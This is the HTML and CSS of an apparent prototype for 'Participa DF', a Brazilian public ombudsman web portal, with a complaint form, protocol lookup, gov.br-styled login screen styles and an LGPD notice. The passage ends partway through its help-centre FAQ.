<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Participa DF - Ouvidoria Digital</title>
    
    <!-- PWA Meta Tags -->
    <meta name="theme-color" content="#004182">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="Participa DF">
    <meta name="description" content="Sistema de Ouvidoria Digital do Distrito Federal. Registre sua manifesta√ß√£o com seguran√ßa conforme a LGPD.">

    <!-- Tailwind CSS v4 -->
    <script src="https://unpkg.com/@tailwindcss/browser@4"></script>
    
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Raleway:wght@400;600;700;900&display=swap');
        @import url('https://fonts.cdnfonts.com/css/rawline');
        
        :root {
            --gov-blue: #004182;
            --gov-blue-dark: #071D41;
            --gov-green: #008C44;
            --gov-yellow: #FDB913;
        }

        body {
            font-family: 'Raleway', sans-serif;
            background-color: #f8fafc;
        }

        .high-contrast {
            filter: contrast(150%) brightness(100%);
            background-color: #000 !important;
            color: #fff !important;
        }

        .high-contrast * {
            border-color: #fff !important;
        }

        .iza-chat-window {
            display: none;
            position: fixed;
            bottom: 100px;
            right: 24px;
            width: 350px;
            max-width: calc(100vw - 48px);
            height: 450px;
            background: white;
            border-radius: 1.5rem;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            z-index: 100;
            flex-direction: column;
            overflow: hidden;
            border: 1px solid #e2e8f0;
            animation: slideUp 0.3s ease-out;
        }

        .iza-chat-window.active {
            display: flex;
        }

        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        @keyframes slidein {
            from { transform: translateY(10px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .animate-slide-up {
            animation: slidein 0.3s ease-out;
        }

        .loading-voice {
            display: none;
            align-items: center;
            gap: 4px;
        }

        .loading-voice.active {
            display: flex;
        }

        .dot {
            width: 6px;
            height: 6px;
            background: #ef4444;
            border-radius: 50%;
            animation: bounce 1.4s infinite ease-in-out both;
        }

        .dot:nth-child(1) { animation-delay: -0.32s; }
        .dot:nth-child(2) { animation-delay: -0.16s; }

        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1.0); }
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .animate-spin {
            animation: spin 1s linear infinite;
        }

        .animate-pulse {
            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
            align-items: center;
            justify-content: center;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 1.5rem;
            padding: 2rem;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            animation: slideUp 0.3s ease-out;
        }

        @media (max-width: 640px) {
            .iza-chat-window {
                width: calc(100vw - 32px);
                height: 60vh;
            }
        }

        /* Estilos do Login Gov.br (Clone Visual) */
        #govbr-login-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff;
            z-index: 10000;
            overflow-y: auto;
            font-family: 'Rawline', 'Raleway', sans-serif;
        }
        
        .govbr-header {
            display: flex;
            align-items: center;
            padding: 16px 24px;
            border-bottom: 1px solid #e6e6e6;
            background: white;
        }

        .govbr-logo {
            height: 40px;
            cursor: pointer;
        }

        .govbr-main {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 2rem 1rem;
        }

        .govbr-content-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2rem;
            width: 100%;
            max-width: 1200px;
        }

        @media (min-width: 768px) {
            .govbr-content-wrapper {
                flex-direction: row;
                align-items: flex-start;
                justify-content: center;
                gap: 4rem;
            }
        }

        .govbr-card {
            width: 100%;
            max-width: 400px;
            flex-shrink: 0;
        }

        .govbr-title {
            color: #1351B4;
            font-weight: 600;
            font-size: 1.25rem;
            margin-bottom: 1rem;
        }

        .govbr-desc {
            color: #333;
            margin-bottom: 1.5rem;
            line-height: 1.5;
        }

        .govbr-label {
            color: #333;
            font-weight: 600;
            display: block;
            margin-bottom: 0.5rem;
        }

        .govbr-input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid #888;
            border-radius: 0.5rem;
            font-size: 1rem;
            margin-bottom: 1.5rem;
            font-family: inherit;
        }

        .govbr-input:focus {
            outline: none;
            border-color: #1351B4;
            box-shadow: 0 0 0 2px rgba(19, 81, 180, 0.2);
        }

        .govbr-btn {
            background-color: #1351B4;
            color: white;
            border-radius: 2rem;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            width: 100%;
            font-size: 1rem;
            transition: background 0.2s;
            border: none;
            cursor: pointer;
        }

        .govbr-btn:hover {
            background-color: #0c326f;
        }

        .govbr-divider {
            display: flex;
            align-items: center;
            margin: 2rem 0;
            color: #333;
            font-weight: 600;
            font-size: 0.9rem;
        }
        
        .govbr-divider::before, .govbr-divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #ccc;
        }
        
        .govbr-divider::before { margin-right: 0.5rem; }
        .govbr-divider::after { margin-left: 0.5rem; }

        .govbr-options-btn {
            border: 1px solid #ccc;
            color: #1351B4;
            background: white;
            border-radius: 2rem;
            padding: 0.75rem;
            width: 100%;
            margin-bottom: 1rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            cursor: pointer;
            transition: background 0.2s;
        }

        .govbr-options-btn:hover {
            background-color: #f5f5f5;
        }

        .govbr-link {
            color: #1351B4;
            text-decoration: none;
            font-weight: 600;
            font-size: 0.9rem;
        }
        
        .govbr-badge-prata {
            background-color: #fff;
            color: #008C44;
            border: 1px solid #008C44;
            font-size: 0.65rem;
            padding: 2px 6px;
            border-radius: 10px;
            margin-left: auto;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .govbr-help-section {
            margin-top: 2rem;
            padding-top: 1rem;
            border-top: 1px solid #e6e6e6;
            text-align: center;
        }

        .govbr-side-image {
            display: none;
            max-width: 600px;
            width: 100%;
        }

        @media (min-width: 768px) {
            .govbr-side-image {
                display: block;
            }
        }
    </style>
</head>
<body class="min-h-screen pb-12">

    <!-- Barra de Acessibilidade -->
    <div class="bg-[#071D41] text-white py-2 px-4 text-xs font-bold sticky top-0 z-50">
        <div class="max-w-6xl mx-auto flex justify-between items-center flex-wrap gap-2">
            <div class="flex items-center gap-4">
                <button onclick="toggleContrast()" class="flex items-center gap-1 hover:text-yellow-400 transition-colors rounded px-2 py-1 hover:bg-white/10">
                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-13c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5z"></path></svg>
                    Alto Contraste
                </button>
                <button onclick="changeFontSize(1)" class="flex items-center gap-1 hover:text-yellow-400 transition-colors rounded px-2 py-1 hover:bg-white/10" title="Aumentar fonte">
                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M9 4v3h5v12h3V7h5V4H9zm-6 14h16v2H3z"></path></svg>
                    A+
                </button>
                <button onclick="changeFontSize(-1)" class="flex items-center gap-1 hover:text-yellow-400 transition-colors rounded px-2 py-1 hover:bg-white/10" title="Diminuir fonte">
                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M5 9v3h5v12h3V12h5V9H5zm-2 10h16v2H3z"></path></svg>
                    A-
                </button>
            </div>
            <div class="flex items-center gap-2">
                <span>üáßüá∑ BRASIL</span>
                <span class="hidden sm:inline opacity-50">| Governo do Distrito Federal</span>
            </div>
        </div>
    </div>

    <!-- Header Principal -->
    <header class="bg-white shadow-md py-4 px-4 sticky top-12 z-40">
        <div class="max-w-6xl mx-auto flex flex-wrap justify-between items-center gap-4">
            <div class="flex items-center gap-3">
                <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="gov.br" class="h-10">
                <div class="border-l border-slate-300 pl-3 flex flex-col justify-center">
                    <span class="text-sm font-bold text-[#004182] leading-tight">Controladoria-Geral<br>do Distrito Federal</span>
                    <span class="text-xs font-bold text-slate-500">CGDF</span>
                </div>
            </div>
            
            <div id="authContainer" class="flex items-center gap-3">
                <button onclick="startGovBrFlow()" class="bg-[#004182] hover:bg-blue-900 text-white px-6 py-2.5 rounded-full font-bold text-sm transition-all shadow-lg active:scale-95 flex items-center gap-2" id="loginBtn">
                    <svg width="18" height="18" fill="currentColor" viewBox="0 0 24 24"><path d="M11 7L9.6 8.4l2.6 2.6H5v2h7.2l-2.6 2.6L11 17l5-5-5-5zm6 6c0 .55.45 1 1 1h1v4c0 1.1-.9 2-2 2h-1v2h1c2.21 0 4-1.79 4-4v-4h1c.55 0 1-.45 1-1s-.45-1-1-1h-1v-4h1c.55 0 1-.45 1-1s-.45-1-1-1h-1V2h-1c-1.1 0-2 .9-2 2v4h-1c-.55 0-1 .45-1 1z"></path></svg>
                    Entrar com gov.br
                </button>
            </div>

            <div id="userProfile" class="hidden flex items-center gap-3 bg-gradient-to-r from-blue-50 to-slate-50 p-2 rounded-full pr-4 border border-slate-200">
                <button onclick="openProfileModal()" class="w-9 h-9 bg-[#004182] text-white rounded-full flex items-center justify-center font-bold text-xs hover:bg-blue-700 transition-colors cursor-pointer shadow-md" id="userInitial" title="Perfil">U</button>
                <span class="text-sm font-bold text-slate-700 hidden sm:inline cursor-pointer hover:text-[#004182]" id="userNameDisplay" onclick="openProfileModal()">Usu√°rio</span>
                <button onclick="logout()" class="text-slate-400 hover:text-red-500 ml-2 transition-colors p-1 hover:bg-red-50 rounded-full" title="Sair">
                    <svg width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"></path></svg>
                </button>
            </div>
        </div>
    </header>

    <main class="max-w-4xl mx-auto px-4 py-8 space-y-10">
        <!-- Abas de Navega√ß√£o -->
        <div class="flex justify-center gap-4 sticky top-28 z-30 py-2 bg-[#f8fafc]/95 backdrop-blur-sm rounded-full">
            <button onclick="switchTab('home')" id="tab-home" class="px-6 py-2 rounded-full font-bold bg-[#004182] text-white shadow-md transition-all hover:scale-105">In√≠cio</button>
            <button onclick="switchTab('help')" id="tab-help" class="px-6 py-2 rounded-full font-bold bg-white text-slate-600 shadow-sm hover:bg-slate-100 transition-all hover:scale-105">Central de Ajuda</button>
        </div>

        <div id="content-home" class="space-y-10">
        <!-- Hero -->
        <section class="text-center space-y-4 animate-slide-up">
            <h1 class="text-4xl md:text-5xl font-black text-[#004182] tracking-tighter">
                Ouvidoria Digital do DF
            </h1>
            <p class="text-lg text-slate-600 font-medium max-w-2xl mx-auto">
                Sua voz transforma o Distrito Federal. Registre sua manifesta√ß√£o com seguran√ßa e confidencialidade.
            </p>
        </section>

        <!-- Se√ß√£o de Consulta de Protocolo -->
        <section class="bg-white rounded-[2rem] shadow-lg p-6 border border-slate-100 animate-slide-up">
            <h2 class="text-xl font-black text-[#004182] mb-4 flex items-center gap-2">
                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                Consultar Andamento
            </h2>
            <div class="flex flex-col md:flex-row gap-3">
                <input type="text" id="searchProtocolInput" placeholder="Digite o n√∫mero do protocolo (Ex: DF-2026-XXXXXX)" class="flex-1 p-3 rounded-xl border-2 border-slate-100 focus:border-[#004182] outline-none transition-all font-mono uppercase font-bold text-slate-700">
                <button onclick="searchProtocol()" class="bg-[#004182] text-white px-6 py-3 rounded-xl font-bold hover:bg-blue-900 transition-all active:scale-95 flex items-center justify-center gap-2">
                    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                    Consultar
                </button>
            </div>
            <div id="searchResult" class="hidden mt-6 p-4 bg-slate-50 rounded-xl border border-slate-200 animate-slide-up"></div>
        </section>

        <!-- Formul√°rio Principal -->
        <div class="bg-white rounded-[2rem] shadow-2xl p-6 md:p-8 border border-slate-100">
            <form id="manifestForm" class="space-y-8">
                <div id="errorAlert" class="hidden bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-xl font-medium animate-slide-up"></div>

                <div class="space-y-4">
                    <label class="block text-lg font-bold text-slate-800">Tipo de Manifesta√ß√£o *</label>
                    <select id="tipo" class="w-full p-4 rounded-xl border-2 border-slate-100 focus:border-[#004182] outline-none transition-all appearance-none bg-slate-50 font-semibold cursor-pointer hover:border-slate-200" required>
                        <option value="">Selecione o tipo...</option>
                        <option value="denuncia">üö® Den√∫ncia</option>
                        <option value="reclamacao">üìù Reclama√ß√£o</option>
                        <option value="sugestao">üí° Sugest√£o</option>
                        <option value="elogio">üëç Elogio</option>
                        <option value="solicitacao">‚ùì Solicita√ß√£o</option>
                    </select>
                </div>

                <div class="space-y-4">
                    <label class="block text-lg font-bold text-slate-800">Assunto *</label>
                    <input type="text" id="assunto" class="w-full p-4 rounded-xl border-2 border-slate-100 focus:border-[#004182] outline-none transition-all bg-slate-50 font-medium" placeholder="Resumo da sua manifesta√ß√£o..." required minlength="5">
                </div>

                <div class="space-y-4">
                    <label class="block text-lg font-bold text-slate-800">Descri√ß√£o Detalhada *</label>
                    <textarea id="descricao" class="w-full p-4 rounded-xl border-2 border-slate-100 focus:border-[#004182] outline-none transition-all bg-slate-50 min-h-[150px] font-medium resize-y" placeholder="Conte-nos exatamente o que aconteceu..." required minlength="20"></textarea>
                    <p class="text-xs text-slate-500">M√≠nimo de 20 caracteres para garantir informa√ß√µes suficientes.</p>
                </div>

                <!-- Anexar M√≠dia -->
                <div class="space-y-4">
                    <label class="block text-lg font-bold text-slate-800">Anexar M√≠dia (opcional)</label>
                    <div class="grid grid-cols-3 gap-4">
                        <label class="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border-2 border-dashed border-slate-200 hover:border-[#004182] cursor-pointer transition-all group">
                            <input type="file" accept="image/*" capture="environment" class="hidden" onchange="handleFile(this, 'Foto')">
                            <i data-lucide="camera" class="w-8 h-8 text-[#004182] mb-2 group-hover:scale-110 transition-transform"></i>
                            <span class="text-xs font-black uppercase text-slate-500 group-hover:text-[#004182] transition-colors text-center">Foto</span>
                        </label>
                        <label class="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border-2 border-dashed border-slate-200 hover:border-[#004182] cursor-pointer transition-all group">
                            <input type="file" accept="video/*" capture="environment" class="hidden" onchange="handleFile(this, 'V√≠deo')">
                            <i data-lucide="video" class="w-8 h-8 text-[#004182] mb-2 group-hover:scale-110 transition-transform"></i>
                            <span class="text-xs font-black uppercase text-slate-500 group-hover:text-[#004182] transition-colors text-center">V√≠deo</span>
                        </label>
                        <label class="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border-2 border-dashed border-slate-200 hover:border-red-500 cursor-pointer transition-all group">
                            <input type="file" accept="audio/*" class="hidden" onchange="handleFile(this, '√Åudio')">
                        <button type="button" onclick="openAudioRecorder()" class="flex flex-col items-center justify-center p-4 bg-slate-50 rounded-2xl border-2 border-dashed border-slate-200 hover:border-red-500 cursor-pointer transition-all group">
                            <i data-lucide="mic" class="w-8 h-8 text-slate-400 group-hover:text-red-500 mb-2 group-hover:scale-110 transition-transform"></i>
                            <span class="text-xs font-black uppercase text-slate-500 group-hover:text-red-500 transition-colors text-center">√Åudio</span>
                        </label>
                            <span class="text-xs font-black uppercase text-slate-500 group-hover:text-red-500 transition-colors text-center">Gravar √Åudio</span>
                        </button>
                    </div>
                    <!-- Lista de arquivos anexados -->
                    <div id="fileStatus" class="hidden flex-col gap-2 animate-slide-up">
                    </div>
                </div>

                <!-- Checkbox An√¥nimo -->
                <div class="flex items-center gap-3 bg-blue-50 p-4 rounded-xl border border-blue-100 hover:bg-blue-100 transition-colors">
                    <input type="checkbox" id="anonimo" class="w-5 h-5 accent-[#004182] cursor-pointer">
                    <label for="anonimo" class="text-sm font-bold text-[#004182] cursor-pointer">Registrar como an√¥nimo (recomendado para den√∫ncias e quest√µes de seguran√ßa)</label>
                </div>

                <!-- Campos de Identifica√ß√£o (se n√£o an√¥nimo) -->
                <div id="identificationFields" class="space-y-4 p-4 bg-slate-50 rounded-xl border border-slate-200 animate-slide-up">
                    <p class="text-sm font-bold text-slate-600 flex items-center gap-2">
                        <svg width="16" height="16" fill="#004182" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
                        Dados para identifica√ß√£o e acompanhamento:
                    </p>
                    <div class="grid md:grid-cols-2 gap-4">
                        <div>
                            <label class="block text-sm font-bold text-slate-700 mb-2">Nome completo *</label>
                            <input type="text" id="nome" class="w-full p-3 rounded-xl border-2 border-slate-100 focus:border-[#004182] outline-none transition-all bg-white font-medium" placeholder="Seu nome" required>
                        </div>
                        <div>
                            <label class="block text-sm font-bold text-slate-700 mb-2">Email *</label>
                            <input type="email" id="email" class="w-full p-3 rounded-xl border-2 border-slate-100 focus:border-[#004182] outline-none transition-all bg-white font-medium" placeholder="seu@email.com" required>
                        </div>
                        <div class="md:col-span-2">
                            <label class="block text-sm font-bold text-slate-700 mb-2">Telefone (opcional)</label>
                            <input type="tel" id="telefone" class="w-full p-3 rounded-xl border-2 border-slate-100 focus:border-[#004182] outline-none transition-all bg-white font-medium" placeholder="(00) 00000-0000">
                        </div>
                    </div>
                </div>

                <!-- Termos LGPD -->
                <div class="bg-slate-50 p-4 rounded-xl border border-slate-200 space-y-3">
                    <div class="flex items-start gap-3">
                        <input type="checkbox" id="lgpdConsent" class="w-5 h-5 mt-1 accent-[#004182] cursor-pointer flex-shrink-0">
                        <label for="lgpdConsent" class="text-xs text-slate-600 font-medium cursor-pointer">
                            <strong class="text-[#004182]">Prote√ß√£o de Dados LGPD:</strong> Declaro estar ciente de que meus dados ser√£o coletados e processados exclusivamente para fins de atendimento desta manifesta√ß√£o, conforme a Lei Geral de Prote√ß√£o de Dados (LGPD - Lei n¬∫ 13.709/2018). Meus dados est√£o protegidos contra acessos n√£o autorizados e n√£o ser√£o compartilhados com terceiros.
                        </label>
                    </div>
                </div>

                <button type="submit" class="w-full bg-[#004182] hover:bg-blue-900 disabled:bg-slate-400 text-white py-5 rounded-2xl font-black text-lg shadow-xl transition-all hover:-translate-y-1 active:scale-95 flex justify-center items-center gap-3 disabled:cursor-not-allowed disabled:opacity-70" id="submitBtn">
                    <svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24" class="w-6 h-6"><path d="M16.6915026,12.4744748 L3.50612381,13.2599618 C3.19218622,13.2599618 3.03521743,13.4170592 3.03521743,13.5741566 L1.15159189,20.0151496 C0.8376543,20.8006365 0.99,21.89 1.77946707,22.52 C2.41,22.99 3.50612381,23.1 4.13399899,22.9429026 L21.714504,14.0454487 C22.6563168,13.5741566 23.1272231,12.6315722 22.9702544,11.6889879 L4.13399899,1.01449236 C3.34915502,0.9 2.40734225,1.00636533 1.77946707,1.4776575 C0.994623095,2.10604706 0.837654326,3.0486314 1.15159189,3.99701575 L3.03521743,10.4380088 C3.03521743,10.5950699 3.19218622,10.7521672 3.50612381,10.7521672 L16.6915026,11.5376541 C16.6915026,11.5376541 17.1624089,11.5376541 17.1624089,11.0663619 L17.1624089,12.4744748 C17.1624089,12.4744748 17.1624089,12.9457669 16.6915026,12.4744748 Z"></path></svg>
                    ENVIAR PROTOCOLO
                </button>
            </form>

            <!-- Success State (Hidden by default) -->
            <div id="successState" class="hidden text-center py-12 space-y-6 animate-slide-up">
                <div class="w-20 h-20 bg-green-100 text-[#008C44] rounded-full flex items-center justify-center mx-auto animate-pulse">
                    <svg width="48" height="48" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
                </div>
                <div class="space-y-2">
                    <h2 class="text-3xl font-black text-[#004182]">MANIFESTA√á√ÉO PROTOCOLADA!</h2>
                    <div class="flex items-center justify-center gap-2 text-sm text-slate-500 font-bold">
                        <svg width="16" height="16" fill="#004182" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.72-7 8.77V11.99H5V7.3l7-3.11v7.8z"></path></svg>
                        Dados protegidos conforme a LGPD.
                    </div>
                    <p class="text-slate-500 font-bold mt-4">Guarde o seu n√∫mero de acompanhamento:</p>
                    <div id="protocolNumber" class="text-4xl font-black text-[#004182] py-4 bg-gradient-to-br from-blue-50 to-slate-50 rounded-2xl border-2 border-dashed border-slate-300 mt-4 font-mono tracking-wider">
                        ---
                    </div>
                </div>
                <p class="text-sm text-slate-600 font-medium">Voc√™ receber√° atualiza√ß√µes via email e poder√° acompanhar pelo painel pessoal.</p>
                <button onclick="resetForm()" class="bg-[#004182] text-white px-8 py-3 rounded-xl font-bold hover:bg-blue-900 transition-all active:scale-95">
                    ‚úèÔ∏è NOVA MANIFESTA√á√ÉO
                </button>
            </div>
        </div>

        <!-- Painel de Acompanhamento (Apenas se logado) -->
        <div id="trackingPanel" class="hidden space-y-6 animate-slide-up">
            <h2 class="text-2xl font-black text-[#004182] flex items-center gap-2">
                <svg width="24" height="24" fill="#004182" viewBox="0 0 24 24"><path d="M9 11H7v2h2v-2zm14-7H1c-.55 0-1 .45-1 1v14c0 .55.45 1 1 1h22c.55 0 1-.45 1-1V5c0-.55-.45-1-1-1zm-4 6h-5v5h5v-5zM9 5H4v5h5V5zm0 14H4v-4h5v4zm6 0h-5v-4h5v4zm6 0h-5v-4h5v4zm-6-6h-5V5h5v8z"></path></svg>
                Minhas Manifesta√ß√µes
            </h2>
            <div id="manifestList" class="space-y-4">
                <p class="text-slate-600 font-medium text-center py-8">Voc√™ ainda n√£o possui manifesta√ß√µes para acompanhar. Envie uma sem marcar "an√¥nimo" para v√™-la aqui!</p>
            </div>
        </div>

        <!-- LGPD Info Banner -->
        <div class="bg-gradient-to-r from-blue-50 to-slate-50 border border-blue-100 rounded-2xl p-6 flex items-start gap-4 shadow-sm">
            <svg width="32" height="32" fill="#004182" viewBox="0 0 24 24" class="shrink-0 mt-0.5"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.72-7 8.77V11.99H5V7.3l7-3.11v7.8z"></path></svg>
            <div>
                <h3 class="font-bold text-[#004182] mb-1">Seus dados est√£o protegidos</h3>
                <p class="text-sm text-slate-600 leading-relaxed">
                    Esta plataforma segue rigorosamente as diretrizes da <strong>Lei Geral de Prote√ß√£o de Dados (LGPD - Lei n¬∫ 13.709/2018)</strong>. Seus dados s√£o utilizados exclusivamente para o atendimento da sua manifesta√ß√£o, com minimiza√ß√£o de coleta e n√£o ser√£o compartilhados com terceiros sem consentimento expl√≠cito. Todos os registros s√£o criptografados e armazenados com seguran√ßa.
                </p>
            </div>
        </div>
        </div>

        <div id="content-help" class="hidden space-y-10">
        <!-- Central de Ajuda -->
        <section class="bg-white rounded-[2rem] shadow-lg p-6 border border-slate-100 animate-slide-up space-y-6">
            <div class="text-center space-y-2">
                <h2 class="text-2xl font-black text-[#004182] flex items-center justify-center gap-2">
                    <svg width="28" height="28" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                    Central de Ajuda
                </h2>
                <p class="text-slate-600 font-medium">Encontre respostas para suas d√∫vidas sobre a Ouvidoria do DF</p>
            </div>

            <div class="space-y-3">
                <!-- FAQ 1 -->
                <details class="group bg-slate-50 rounded-xl border border-slate-200 overflow-hidden transition-all hover:border-[#004182]">
                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-slate-800 list-none select-none">
                        <span>Qual a diferen√ßa entre den√∫ncia e reclama√ß√£o?</span>
                        <span class="transition-transform duration-300 group-open:rotate-180 text-[#004182]">
                            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
                        </span>
                    </summary>
                    <div class="p-4 pt-0 text-slate-600 text-sm leading-relaxed border-t border-slate-200 mt-2">
                        <p>A <strong>den√∫ncia</strong> √© utilizada para comunicar irregularidades, atos il√≠citos ou viola√ß√µes de normas na administra√ß√£o p√∫blica (ex: uso indevido de carro oficial). J√° a <strong>reclama√ß√£o</strong> serve para manifestar insatisfa√ß√£o com a qualidade de servi√ßos p√∫blicos prestados ou conduta de agentes p√∫blicos (ex: demora no atendimento).</p>
                    </div>
                </details>

                <!-- FAQ 2 -->
                <details class="group bg-slate-50 rounded-xl border border-slate-200 overflow-hidden transition-all hover:border-[#004182]">
                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-slate-800 list-none select-none">
                        <span>Posso fazer uma manifesta√ß√£o an√¥nima?</span>
                        <span class="transition-transform duration-300 group-open:rotate-180 text-[#004182]">
                            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
                        </span>
                    </summary>
                    <div class="p-4 pt-0 text-slate-600 text-sm leading-relaxed border-t border-slate-200 mt-2">
                        <p>Sim. Basta marcar a op√ß√£o <strong>"Registrar como an√¥nimo"</strong> no formul√°rio. Neste caso, seus dados pessoais n√£o ser√£o coletados, mas √© fundamental que voc√™ guarde o n√∫mero do protocolo gerado para acompanhar o andamento, pois n√£o receber√° notifica√ß√µes por e-mail.</p>
                    </div>
                </details>

                <!-- FAQ 3 -->
                <details class="group bg-slate-50 rounded-xl border border-slate-200 overflow-hidden transition-all hover:border-[#004182]">
                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-slate-800 list-none select-none">
                        <span>Qual o prazo para resposta?</span>
                        <span class="transition-transform duration-300 group-open:rotate-180 text-[#004182]">
                            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
                        </span>
                    </summary>
                    <div class="p-4 pt-0 text-slate-600 text-sm leading-relaxed border-t border-slate-200 mt-2">
                        <p>O prazo legal para resposta √© de <strong>30 dias</strong>, podendo ser prorrogado por mais 30 dias mediante justificativa expressa do √≥rg√£o respons√°vel. Em m√©dia, buscamos responder antes desse prazo.</p>
                    </div>
                </details>

                <!-- FAQ 4 -->
                <details class="group bg-slate-50 rounded-xl border border-slate-200 overflow-hidden transition-all hover:border-[#004182]">
                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-slate-800 list-none select-none">
                        <span>Como acompanho minha manifesta√ß√£o?</span>
                        <span class="transition-transform duration-300 group-open:rotate-180 text-[#004182]">
                            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
                        </span>
                    </summary>
                    <div class="p-4 pt-0 text-slate-600 text-sm leading-relaxed border-t border-slate-200 mt-2">
                        <p>Voc√™ pode acompanhar utilizando o n√∫mero do protocolo na se√ß√£o <strong>"Consultar Andamento"</strong> no topo desta p√°gina. Se estiver logado com sua conta gov.br, tamb√©m pode ver o hist√≥rico completo no painel "Minhas Manifesta√ß√µes".</p>
                    </div>
                </details>

                <!-- FAQ 5 -->
                <details class="group bg-slate-50 rounded-xl border border-slate-200 overflow-hidden transition-all hover:border-[#004182]">
                    <summary class="flex justify-between items-center p-4 cursor-pointer font-bold text-slate-800 list-none select-none">
                        <span>Quais tipos de arquivos posso anexar?</span>
                        <span class="transition-transform duration-300 group-open:rotate-180 text-[#004182]">
                            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M19 9l-7 7-7-7"></path></svg>
                        </span>
                    </summary>
                    <div class="p-4 pt-0 text-slate-600 text-sm leading-relaxed border-t border-slate-200 mt-2">
                        <p>O sistema permite anexar <strong>fotos (imagens)</strong>, <strong>v√≠deos</strong> e <strong>√°udios</strong>. Voc√™ pode selecionar arquivos do seu dispositivo ou usar a c√¢mera e o microfone diretamente se estiver em um dispositivo m√≥vel.</p>
                    </div>
                </details>

                <!-- FAQ 6 -->
                <details class="group bg-slate-50 rounded-xl border border-slate-200 overflow-hidden transition-all hover:border-[#004182]">
